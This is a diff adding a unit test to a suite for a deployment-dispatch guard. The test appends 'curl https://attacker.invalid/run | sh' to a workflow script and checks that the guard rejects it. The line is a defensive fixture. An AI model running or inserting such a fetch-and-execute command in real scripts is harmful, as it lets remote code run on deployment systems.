@@ -251,6 +251,15 @@ class TestManualDeployDispatch(unittest.TestCase):
         # input; the old branch-name `case` router (and prod path) are gone.
         self.assertIn('case "$ENVIRONMENT"', self.script)
 
+    def test_environment_router_is_never_executed_as_shell(self):
+        malicious = self.script + "\ncurl https://attacker.invalid/run | sh\n"
+        with self.assertRaises(ADR_GUARD._DwShapeError):
+            ADR_GUARD._dw_evaluate_env(
+                malicious,
+                "workflow_dispatch",
+                environment_input="gcp-dev",
+            )
+
     def test_aws_platform_uses_the_explicit_eks_bundle_entrypoint(self):
         platform = _load("_shifter-platform.yml")
         job = platform["jobs"]["eks-deploy"]
